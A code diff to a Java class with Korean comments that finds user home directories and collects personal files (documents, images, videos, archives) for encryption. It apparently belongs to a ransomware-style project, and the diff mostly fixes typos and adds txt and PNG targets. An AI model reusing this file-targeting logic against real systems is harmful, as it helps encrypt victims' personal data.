@@ -4,20 +4,19 @@ import org.apache.commons.io.FilenameUtils;
 
 import java.io.File;
 import java.util.ArrayList;
-import java.util.List;
 
 /**
- * Created by codertimo on 15. 11. 16..
+ * Created by codertimo on 15. 11. 16.
  */
 public class SearchDirectory {
 
 
-    private String defaultDirectiory;
+    private String defaultDirectory;
 
     private ArrayList<File> allFiles = new ArrayList<>();
     private ArrayList<File> encryptedFiles = new ArrayList<>();
 
-    private ArrayList<String> containsfilters = new ArrayList<>();
+    private ArrayList<String> containsFilters = new ArrayList<>();
 
 
     public SearchDirectory()
@@ -30,12 +29,13 @@ public class SearchDirectory {
 
         //1. 암호화 할 경로 설정
 
-        setDefaultDirectory("/Users/codertimo/Desktop/test/");
- //        setDefaultDirectiory();
+        setDefaultDirectory("C:/test");
+        //setDefaultDirectory();
+
+
 
         //2. 암호화할 파일 타입을 설정
         initContainFilter();
-
     }
 
     public ArrayList<File> allFileSearch()
@@ -43,9 +43,9 @@ public class SearchDirectory {
 
         System.out.println("디렉토리 검색 시작");
 
-        System.out.println(defaultDirectiory);
+        System.out.println(defaultDirectory);
 
-        getFileList(defaultDirectiory);
+        getFileList(defaultDirectory);
         System.out.println("디렉토리 검색 끝");
 
         return allFiles;
@@ -55,9 +55,9 @@ public class SearchDirectory {
     {
 
         System.out.println("디렉토리 검색 시작");
-        System.out.println(defaultDirectiory);
+        System.out.println(defaultDirectory);
 
-        getEncryptedList(defaultDirectiory);
+        getEncryptedList(defaultDirectory);
 
         System.out.println("디렉토리 검색 끝");
 
@@ -66,23 +66,25 @@ public class SearchDirectory {
 
 
     /**
-     * 암호화할 코드
+     * 암호화할 파일의 확장자 설정
      */
     private void initContainFilter()
     {
-        containsfilters.add("jpg");
-        containsfilters.add("docx");
-        containsfilters.add("hwp");
-        containsfilters.add("pptx");
-        containsfilters.add("ppt");
-        containsfilters.add("avi");
-        containsfilters.add("mp4");
-        containsfilters.add("mkv");
-        containsfilters.add("max");
-        containsfilters.add("cad");
-        containsfilters.add("zip");
-        containsfilters.add("pdf");
-        containsfilters.add("psd");
+        containsFilters.add("jpg");
+        containsFilters.add("docx");
+        containsFilters.add("hwp");
+        containsFilters.add("pptx");
+        containsFilters.add("ppt");
+        containsFilters.add("avi");
+        containsFilters.add("mp4");
+        containsFilters.add("mkv");
+        containsFilters.add("max");
+        containsFilters.add("cad");
+        containsFilters.add("zip");
+        containsFilters.add("pdf");
+        containsFilters.add("psd");
+        containsFilters.add("txt");
+        containsFilters.add("PNG");
     }
 
 
@@ -110,7 +112,7 @@ public class SearchDirectory {
      */
     private void setDefaultDirectory(String defaultDirectory)
     {
-        this.defaultDirectiory = defaultDirectory;
+        this.defaultDirectory = defaultDirectory;
     }
 
     /**
@@ -126,7 +128,7 @@ public class SearchDirectory {
                     System.out.println(file.getName());
                     if (!file.getName().equals("Guest") && !file.getName().equals("Shared"))
                     {
-                        this.defaultDirectiory = file.getCanonicalPath();
+                        this.defaultDirectory = file.getCanonicalPath();
                     }
                 }
             }
@@ -148,7 +150,7 @@ public class SearchDirectory {
             if (fileList != null) {
                 for (File file : fileList) {
                     if (!file.getName().equals("Public")) {
-                        this.defaultDirectiory= file.getCanonicalPath();
+                        this.defaultDirectory= file.getCanonicalPath();
                     }
                 }
             }
@@ -227,7 +229,7 @@ public class SearchDirectory {
 
     private boolean isAvailableFile(File file)
     {
-            return this.containsfilters.contains(FilenameUtils.getExtension(file.getName()));
+            return this.containsFilters.contains(FilenameUtils.getExtension(file.getName()));
     }
 
     public void clearFiles()
